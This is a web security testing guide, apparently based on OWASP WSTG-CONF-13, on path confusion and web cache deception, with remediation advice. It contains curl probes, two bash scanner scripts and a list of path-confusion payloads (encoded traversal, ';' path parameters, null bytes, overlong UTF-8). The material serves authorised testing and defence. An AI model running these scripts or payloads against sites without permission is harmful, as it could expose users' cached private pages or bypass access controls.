# WSTG-CONF-13: Test for Path Confusion

## Test ID
WSTG-CONF-13

## Test Name
Test for Path Confusion

## High-Level Description

Path confusion vulnerabilities arise when web servers, application frameworks, or caching systems interpret URL paths differently. Attackers can exploit these inconsistencies to bypass security controls, trigger web cache deception, or access restricted resources. This test identifies path handling discrepancies that could lead to security vulnerabilities.

---

## What to Check

### Path Confusion Scenarios

- [ ] Path normalization differences
- [ ] URL encoding handling
- [ ] Trailing slash behavior
- [ ] Path parameter handling
- [ ] Extension handling
- [ ] Cache key generation
- [ ] Router/framework path matching

### Attack Vectors

| Attack | Description |
|--------|-------------|
| Web Cache Deception | Cache stores sensitive responses |
| Path Traversal | Access unauthorized files |
| Security Bypass | Bypass authentication/authorization |
| Cache Poisoning | Poison cache with malicious content |

---

## How to Test

### Step 1: Test Path Normalization

```bash
# Original URL
curl -s https://target.com/user/dashboard

# Test with added path segments
curl -s "https://target.com/user/dashboard/test.css"
curl -s "https://target.com/user/dashboard/nonexistent.js"
curl -s "https://target.com/user/dashboard/.css"
curl -s "https://target.com/user/dashboard/..%2F..%2Ftest"

# Compare responses - if sensitive data appears with added extensions,
# path confusion exists
```

### Step 2: Web Cache Deception Test

```bash
#!/bin/bash
TARGET=$1
SENSITIVE_PATH="/user/profile"  # Authenticated page

echo "=== WEB CACHE DECEPTION TEST ==="

# Test with static file extensions
extensions=(".css" ".js" ".png" ".jpg" ".gif" ".ico" ".woff" "/style.css" "/image.png")

for ext in "${extensions[@]}"; do
    test_url="https://$TARGET${SENSITIVE_PATH}${ext}"
    echo ""
    echo "Testing: $test_url"

    # First request (authenticated)
    curl -s "$test_url" \
        -H "Cookie: session=YOUR_SESSION_COOKIE" \
        -o /dev/null \
        -w "Status: %{http_code}, Size: %{size_download}\n"

    # Second request (unauthenticated) - check if cached
    curl -s "$test_url" \
        -o response.txt \
        -w "Status: %{http_code}, Size: %{size_download}\n"

    # Check for sensitive data in response
    if grep -qi "email\|username\|profile\|account" response.txt; then
        echo "[!] POTENTIAL CACHE DECEPTION - Sensitive data found!"
    fi
done
```

### Step 3: Test Path Parameter Confusion

```bash
# Path parameters (common in Java/Spring)
curl -s "https://target.com/api/users;id=1/profile"
curl -s "https://target.com/api/users;.js"

# Matrix parameters
curl -s "https://target.com/api/users;format=json"

# Compare with normal path
curl -s "https://target.com/api/users/profile"
```

### Step 4: Test URL Encoding Variations

```bash
# Standard encoding
curl -s "https://target.com/admin"

# Double encoding
curl -s "https://target.com/%61dmin"          # 'a' encoded
curl -s "https://target.com/%2561dmin"        # double encoded

# Unicode/UTF-8
curl -s "https://target.com/admin%c0%af"      # overlong encoding
curl -s "https://target.com/admin%e0%80%af"

# Mixed case
curl -s "https://target.com/ADMIN"
curl -s "https://target.com/Admin"
```

### Step 5: Test Trailing Slash Behavior

```bash
# With and without trailing slash
curl -sI "https://target.com/admin"
curl -sI "https://target.com/admin/"
curl -sI "https://target.com/admin//"
curl -sI "https://target.com/admin///"

# Compare response codes and redirects
```

### Step 6: Test Extension Handling

```bash
# Add various extensions
base_url="https://target.com/api/sensitive-data"

extensions=(".json" ".xml" ".html" ".txt" ".css" ".js"
            ".png" ".jpg" ".gif" ".svg" ".woff" ".woff2"
            ".map" ".php" ".asp" ".aspx" ".jsp")

for ext in "${extensions[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "${base_url}${ext}")
    echo "${base_url}${ext}: $status"
done
```

### Step 7: Test CDN/Cache Behavior

```bash
# Check cache headers
curl -sI "https://target.com/user/dashboard" | grep -i "cache\|age\|cdn\|x-cache"

# Test with cache-busting and static extension
curl -sI "https://target.com/user/dashboard/$(date +%s).css" | grep -i "cache\|age"

# Check for Vary header
curl -sI "https://target.com/user/dashboard" | grep -i "vary"
```

---

## Tools

### Manual Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **curl** | HTTP client | Path manipulation testing |
| **Burp Suite** | Web proxy | Path fuzzing |
| **OWASP ZAP** | Web scanner | Automated testing |

### Specialized Tools

| Tool | Description |
|------|-------------|
| **Web Cache Deception Scanner** | Burp extension |
| **ParamMiner** | Hidden parameter discovery |

---

## Example Commands/Payloads

### Web Cache Deception Test Script

```bash
#!/bin/bash
TARGET=$1
AUTH_COOKIE=$2

echo "=== WEB CACHE DECEPTION SCANNER ==="
echo "Target: $TARGET"
echo ""

# Sensitive endpoints to test
endpoints=(
    "/account"
    "/user/profile"
    "/api/me"
    "/settings"
    "/dashboard"
    "/my-account"
)

# Static file extensions
static_exts=(".css" ".js" ".png" ".jpg" ".gif" ".ico" ".svg" ".woff")

for endpoint in "${endpoints[@]}"; do
    echo ""
    echo "[+] Testing: $endpoint"

    for ext in "${static_exts[@]}"; do
        test_url="https://$TARGET${endpoint}${ext}"

        # Authenticated request (to potentially cache sensitive data)
        auth_response=$(curl -s "$test_url" -H "Cookie: $AUTH_COOKIE" -w "\n%{http_code}")
        auth_status=$(echo "$auth_response" | tail -1)
        auth_body=$(echo "$auth_response" | head -n -1)

        # Wait for potential caching
        sleep 1

        # Unauthenticated request
        unauth_response=$(curl -s "$test_url" -w "\n%{http_code}")
        unauth_status=$(echo "$unauth_response" | tail -1)
        unauth_body=$(echo "$unauth_response" | head -n -1)

        # Compare
        if [ "$auth_status" == "200" ] && [ "$unauth_status" == "200" ]; then
            if [ "$auth_body" == "$unauth_body" ]; then
                echo "  [!] POTENTIAL VULN: ${endpoint}${ext}"
                echo "      Auth and unauth responses match!"
            fi
        fi
    done
done
```

### Path Confusion Payloads

```
# Path Parameter Injection
/admin;.css
/admin;.js
/admin/..;/admin
/admin/.;/admin

# Path Normalization
/admin/./
/admin/../admin/
/admin/test/../
/admin%2f..%2fadmin

# Extension Confusion
/api/users.json.css
/api/users.css.json
/api/users/.css

# Null Byte (legacy)
/admin%00.css
/admin%00.jpg

# Unicode Normalization
/admin%c0%ae%c0%ae/
/admin%e0%80%ae/
```

---

## Remediation Guide

### 1. Consistent Path Handling

```python
# Django - Strict URL patterns
urlpatterns = [
    path('user/dashboard/', views.dashboard, name='dashboard'),  # Use trailing slash
]

# Add APPEND_SLASH = True for consistency
```

```java
// Spring - Strict path matching
@Configuration
public class WebConfig implements WebMvcConfigurer {
    @Override
    public void configurePathMatch(PathMatchConfigurer configurer) {
        configurer.setUseSuffixPatternMatch(false);
        configurer.setUseTrailingSlashMatch(false);
    }
}
```

### 2. Cache Configuration

```nginx
# Nginx - Don't cache based on extension alone
location ~* \.(css|js|png|jpg|gif|ico)$ {
    # Only cache actual static files, not dynamic paths
    try_files $uri =404;
    expires 1d;
    add_header Cache-Control "public, immutable";
}

# Ensure dynamic content is not cached
location /user/ {
    add_header Cache-Control "private, no-store";
}
```

### 3. CDN Configuration

```
# Cloudflare Page Rules
- Match: /user/*
- Cache Level: Bypass

# Or use Cache-Control headers
Cache-Control: private, no-store, no-cache
Vary: Cookie, Authorization
```

### 4. Input Validation

```python
# Validate and normalize paths
from urllib.parse import urlparse, unquote

def normalize_path(path):
    # Decode URL encoding
    decoded = unquote(path)

    # Remove path traversal attempts
    normalized = os.path.normpath(decoded)

    # Validate against allowed paths
    if not is_allowed_path(normalized):
        raise ValueError("Invalid path")

    return normalized
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Web Cache Deception (sensitive data) | 7.5 | High |
| Path confusion bypassing auth | 8.8 | High |
| Path confusion information disclosure | 5.3 | Medium |
| Inconsistent path handling | 3.7 | Low |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-436** | Interpretation Conflict | Path interpretation differences |
| **CWE-525** | Use of Web Browser Cache | Cache deception |
| **CWE-22** | Path Traversal | Unauthorized file access |

---

## References

- [OWASP WSTG - Test for Path Confusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/13-Test_for_Path_Confusion)
- [Web Cache Deception Research](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)
- [PortSwigger Web Cache Deception](https://portswigger.net/research/web-cache-deception)

---

## Checklist

```
[ ] Path normalization tested
[ ] URL encoding variations tested
[ ] Trailing slash behavior checked
[ ] Extension handling tested
[ ] Path parameters tested (;param)
[ ] Cache headers analyzed
[ ] Web cache deception tested
[ ] CDN behavior analyzed
[ ] Router regex patterns reviewed (white-box)
[ ] Inconsistencies documented
[ ] Risk assessment completed
```
